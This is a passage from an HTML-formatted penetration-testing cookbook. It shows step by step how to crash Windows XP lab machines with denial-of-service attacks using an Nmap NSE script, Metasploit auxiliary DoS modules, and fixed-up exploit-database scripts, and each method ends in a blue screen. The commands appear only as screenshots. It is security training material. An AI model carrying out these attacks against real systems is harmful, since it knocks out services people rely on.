<li value="3" class="calibre19">To read the script from top to bottom, we should use the <kbd class="calibre16">cat</kbd> command on the file and then pipe the output to the <kbd class="calibre16">more</kbd> utility. The top part of the script describes the vulnerability that it exploits and the conditions that must exist for a system to be vulnerable. It also explains that the exploit will cause a <strong class="calibre1">blue screen of death</strong> (<strong class="calibre1">BSOD</strong>) DoS. By scrolling further down, we can find more useful information:</li>
</ol>
<div class="p"><img class="alignnone231" src="../images/00049.jpeg"/></div>
<ol start="4" class="calibre20">
<li value="4" class="calibre19">Further down in the script, we can find a description of the script usage and the arguments that can be supplied with the script. It also provides additional details about the vulnerability it exploits. To execute the script, we will need to use the <kbd class="calibre16">--script</kbd> option in Nmap:</li>
</ol>
<div class="p"><img class="alignnone197" src="../images/00504.jpeg"/></div>
<ol start="5" class="calibre20">
<li value="5" class="calibre19">In the example provided, Nmap is directed to only scan TCP port <kbd class="calibre16">445</kbd>, which is the port associated with the vulnerability. The <kbd class="calibre16">--script</kbd> option is used in conjunction with the argument that specifies the script to be used. A single script argument is passed to indicate that an unsafe scan is acceptable.</li>
<li value="6" class="calibre19">This argument is described as a safety switch that can be used to authorize the DoS attack. After executing the script in Nmap, the output indicates that the system is vulnerable to the attack. Looking back at the Windows XP machine, we can see that the DoS was successful, and this results in a BSOD:</li>
</ol>
<div class="p"><img class="alignnone232" src="../images/00055.jpeg"/></div>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="9F8IS1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How it works…</h1>
            

            <article>
                
<p class="calibre5">The Nmap NSE script demonstrated in this exercise is an example of a buffer-overflow attack. Generally speaking, buffer overflows are capable of causing denial of service because they can result in arbitrary data being loaded into unintended segments of memory. This can disrupt the flow of execution and results in a crash of the service or operating system.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="9G73E1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">DoS attacks with Metasploit</h1>
            

            <article>
                
<p class="calibre5">The Metasploit framework has numerous auxiliary module scripts that can be used to perform DoS attacks. This specific recipe will demonstrate how to locate DoS modules, identify the usage of the modules, and execute them.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="9H5K01-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Getting ready</h1>
            

            <article>
                
<p class="calibre5">To use Metasploit to perform DoS attacks, you will need to have a system that is running a vulnerable service addressed by one of the Metasploit DoS auxiliary modules. In the examples provided, an instance of Windows XP is used for this purpose. For more information on setting up a Windows system, refer to the <em class="calibre15">Installing Windows Server</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="9I44I1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How to do it…</h1>
            

            <article>
                
<p class="calibre5">The following steps demonstrate the use of Metasploit to perform Dos attacks:</p>
<ol class="calibre20">
<li value="1" class="calibre19">Prior to using Metasploit auxiliary modules to perform DoS testing, we will need to identify what DoS modules are available. The relevant modules can be identified by browsing through the Metasploit directory tree:</li>
</ol>
<div class="p"><img class="alignnone233" src="../images/00630.jpeg"/></div>
<ol start="2" class="calibre20">
<li value="2" class="calibre19">By browsing to the <kbd class="calibre16">/modules/auxiliary/dos</kbd> directory, we can see the various categories of DoS modules. In the example provided, we have browsed to the directory that contains Windows HTTP denial-of-service exploits:</li>
</ol>
<div class="p"><img class="alignnone234" src="../images/00059.jpeg"/></div>
<ol start="3" class="calibre20">
<li value="3" class="calibre19">The vulnerability allows remote unauthenticated attackers to force the IIS server to become unresponsive until the IIS service is restarted manually by the administrator. It is required that active server pages are hosted by the IIS and that an ASP script reads out a post form value.</li>
<li value="4" class="calibre19">To read the script from top to bottom, we should use the <kbd class="calibre16">cat</kbd> command on the file and then pipe the output to the <kbd class="calibre16">more</kbd> utility. The top part of the script describes the vulnerability that it exploits and the conditions that must exist for a system to be vulnerable. We can also identify potential DoS exploits within the Metasploit Framework Console. To access this, type <kbd class="calibre16">msfconsole</kbd> in a Terminal:</li>
</ol>
<div class="p"><img class="alignnone235" src="../images/00060.jpeg"/></div>
<ol start="5" class="calibre20">
<li value="5" class="calibre19">Once it's opened, the <kbd class="calibre16">search</kbd> command can be used in conjunction with a search term to identify the potential exploits to use:</li>
</ol>
<div class="p"><img class="alignnone236" src="../images/00062.jpeg"/></div>
<ol start="6" class="calibre20">
<li value="6" class="calibre19">In the example provided, the search term <kbd class="calibre16">dos</kbd> was used to query the database. A series of auxiliary DoS modules was returned, and the relative path for each was included. This relative path can be used to narrow down the search results:</li>
</ol>
<div class="p"><img class="alignnone237" src="../images/00064.jpeg"/></div>
<ol start="7" class="calibre20">
<li value="7" class="calibre19">After querying the relative path of <kbd class="calibre16">/dos/windows/smb</kbd>, the only results that are returned are the DoS modules in this directory. The directories are well organized and can be used to effectively search for exploits that pertain to a particular platform or service. Once we decide which exploit to use, we can select it with the <kbd class="calibre16">use</kbd> command and the relative path of the module:</li>
</ol>
<div class="p"><img class="alignnone238" src="../images/00067.jpeg"/></div>
<ol start="8" class="calibre20">
<li value="8" class="calibre19">Once the module has been selected, the <kbd class="calibre16">show options</kbd> command can be used to identify and/or modify scan configurations. This command will display four column headers: <kbd class="calibre16">Name</kbd>, <kbd class="calibre16">Current Setting</kbd>, <kbd class="calibre16">Required</kbd>, and <kbd class="calibre16">Description</kbd>:
<ul class="calibre30">
<li class="calibre19">The <kbd class="calibre16">Name</kbd> column identifies the name of each configurable variable.</li>
<li class="calibre19">The <kbd class="calibre16">Current Setting</kbd> column lists the existing configuration for any given variable.</li>
<li class="calibre19">The <kbd class="calibre16">Required</kbd> column identifies whether a value is required for any given variable.</li>
<li class="calibre19">The <kbd class="calibre16">Description</kbd> column describes the function of each variable. The value for any given variable can be changed using the <kbd class="calibre16">set</kbd> command and by providing the new value as an argument:</li>
</ul>
</li>
</ol>
<div class="p"><img class="alignnone239" src="../images/00070.jpeg"/></div>
<ol start="9" class="calibre20">
<li value="9" class="calibre19">In the example provided, the <kbd class="calibre16">RHOST</kbd> value was changed to the IP address of the remote system that we wish to scan. After updating the necessary variables, the configurations can be verified using the <kbd class="calibre16">show options</kbd> command again. Once the desired configurations have been verified, the module can be launched with the <kbd class="calibre16">run</kbd> command:</li>
</ol>
<div class="p"><img class="alignnone240" src="../images/00071.jpeg"/></div>
<ol start="10" class="calibre20">
<li value="10" class="calibre19">After executing the Metasploit DoS <kbd class="calibre16">auxiliary</kbd> module, a series of messages is returned to indicate that a series of malicious SMB transactions have been performed, and a final message indicating that the module execution completed is returned. The success of the exploit can be verified by referring back to the Windows XP system, which has crashed and now displays a BSOD:</li>
</ol>
<div class="p"><img class="alignnone241" src="../images/00073.jpeg"/></div>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="9J2L41-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How it works…</h1>
            

            <article>
                
<p class="calibre5">The Metasploit DoS <kbd class="calibre16">auxiliary</kbd> module demonstrated in this exercise is an example of a buffer-overflow attack. Generally speaking, buffer overflows are capable of causing a denial of service because they can result in arbitrary data being loaded into unintended segments of memory. This can disrupt the flow of execution and result in a crash of the service or operating system.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="9K15M1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">DoS attacks with the exploit database</h1>
            

            <article>
                
<p class="calibre5">The <strong class="calibre1">exploit database</strong> is a collection of publicly released exploits for all types of platforms and services. The exploit database has numerous exploits that can be used to perform DoS attacks. This specific recipe will demonstrate how to locate DoS exploits in the exploit database, identify the usage of the exploits, make the necessary modifications, and execute them.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="9KVM81-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Getting ready</h1>
            

            <article>
                
<p class="calibre5">To use the exploit database to perform DoS attacks, you will need to have a system that is running a vulnerable service addressed by one of the Metasploit DoS auxiliary modules. In the examples provided, an instance of Windows XP is used for this purpose. For more information on setting up a Windows system, refer to the <em class="calibre15">Installing Windows Server</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="9LU6Q1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How to do it…</h1>
            

            <article>
                
<p class="calibre5">To perform DoS attacks using the exploit database, follow the given steps:</p>
<ol class="calibre20">
<li value="1" class="calibre19">Prior to using the exploit database to perform DoS testing, we will need to identify which DoS exploits are available. The total exploit database can be found online at <a href="http://www.exploit-db.com" class="calibre6">http://www.exploit-db.com</a>. Alternatively, a copy is locally stored in the Kali Linux filesystem. There is a <kbd class="calibre16">files.csv</kbd> file within the <kbd class="calibre16">exploitdb</kbd> directory that contains a catalog of all the contents. This file can be used to <kbd class="calibre16">grep</kbd> for keywords to help locate usable exploits:</li>
</ol>
<div class="p"><img class="alignnone242" src="../images/00075.jpeg"/></div>
<ol start="2" class="calibre20">
<li value="2" class="calibre19">In the example provided, the <kbd class="calibre16">grep</kbd> function was used to search the <kbd class="calibre16">files.csv</kbd> file for any exploit database contents that could be identified by the word <kbd class="calibre16">SMB</kbd>. It is also possible to narrow down the search even further by piping the output to another <kbd class="calibre16">grep</kbd> function and searching for an additional term:</li>
</ol>
<div class="p"><img class="alignnone243" src="../images/00077.jpeg"/></div>
<ol start="3" class="calibre20">
<li value="3" class="calibre19">In the example provided, two independent <kbd class="calibre16">grep</kbd> functions are used in sequence to search for any DoS exploits that are related to the SMB service:</li>
</ol>
<div class="p"><img class="alignnone244" src="../images/00080.jpeg"/></div>
<ol start="4" class="calibre20">
<li value="4" class="calibre19">We can continue to narrow down the search results to be as specific as possible. In the example provided, we have looked for any Python DoS scripts for the SMB service, but we looked for those that are not for the Windows 7 platform. The <kbd class="calibre16">-v</kbd> option in <kbd class="calibre16">grep</kbd> can be used to exclude content from the results. It is usually best to copy the desired exploit to another location to not modify the contents of the exploit database directories:</li>
</ol>
<div class="p"><img class="alignnone245" src="../images/00320.jpeg"/></div>
<ol start="5" class="calibre20">
<li value="5" class="calibre19">In the example provided, a new directory is created for the script. The script is then copied from the absolute path that can be inferred by the directory location of the exploit database and the relative path defined in the <kbd class="calibre16">files.csv</kbd> file. Once relocated, the script can be read from top to bottom using the <kbd class="calibre16">cat</kbd> command and then piping the content of the script over to the <kbd class="calibre16">more</kbd> utility:</li>
</ol>
<div class="p"><img class="alignnone246" src="../images/00409.jpeg"/></div>
<ol start="6" class="calibre20">
<li value="6" class="calibre19">Unlike the NSE scripts and Metasploit auxiliary modules, there is no standardized format for scripts within the exploit database. As such, working with the exploits can sometimes be tricky. Nonetheless, it is often helpful to review the contents of the script briefly for comments or explanation of usage. In the example provided, we can see that the usage is listed in the contents of the script and is also printed to the user if the appropriate number of arguments is not supplied.</li>
<li value="7" class="calibre19">After evaluation, the script can be executed as follows:</li>
</ol>
<div class="p"><img class="alignnone247" src="../images/00488.jpeg"/></div>
<ol start="8" class="calibre20">
<li value="8" class="calibre19">However, after attempting to execute the script, we can see that problems arise. As a result of the lack of standardization and because some of the scripts are only proofs of concept, adjustments often need to be made to these scripts:</li>
</ol>
<div class="p"><img class="alignnone248" src="../images/00559.jpeg"/></div>
<ol start="9" class="calibre20">
<li value="9" class="calibre19">After the script errors out, we will need to return to the text editor and attempt to determine the source of the errors. The first error indicates a problem with the location of the Python interpreter that is listed at the beginning of the script. This must be changed to point to the interpreter in the Kali Linux filesystem:</li>
</ol>
<div class="p"><img class="alignnone249" src="../images/00620.jpeg"/></div>
<ol start="10" class="calibre20">
<li value="10" class="calibre19">It is often a good idea to attempt to run a script again after each problem is resolved, as sometimes fixing a single problem will eliminate multiple execution errors. In this case, after changing the location of the Python interpreter, we are able to successfully run the script:</li>
</ol>
<div class="p"><img class="alignnone250" src="../images/00667.jpeg"/></div>
<ol start="11" class="calibre20">
<li value="11" class="calibre19">When the script runs, several messages are returned to identify the progress of the script execution. The final message indicates that the malicious payload was delivered and that the server should have crashed. The success of the script can be verified by referring back to the Windows server, which has now crashed and is displaying a BSOD:</li>
</ol>
<div class="p"><img class="alignnone251" src="../images/00052.jpeg"/></div>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="9MSNC1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How it works…</h1>
            

            <article>
                
<p class="calibre5">The exploit database DoS script demonstrated in this exercise is an example of the buffer-overflow attack. Generally speaking, buffer overflows are capable of causing a denial of service because they can result in arbitrary data being loaded into unintended segments of memory. This can disrupt the flow of execution and result in a crash of the service or operating system.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    </body></html>